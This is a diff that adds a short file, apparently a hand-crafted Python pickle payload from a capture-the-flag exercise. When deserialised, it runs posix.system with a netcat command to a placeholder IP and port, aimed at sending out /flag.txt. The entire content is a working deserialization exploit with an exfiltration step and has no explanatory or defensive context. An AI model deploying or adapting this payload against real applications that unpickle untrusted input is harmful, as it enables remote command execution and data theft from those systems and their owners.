@@ -1,0 +1,8 @@
+cposix
+system
+p0
+(S'nc <ip> <port> /flag.txt'
+p1
+tp2
+Rp3
+.
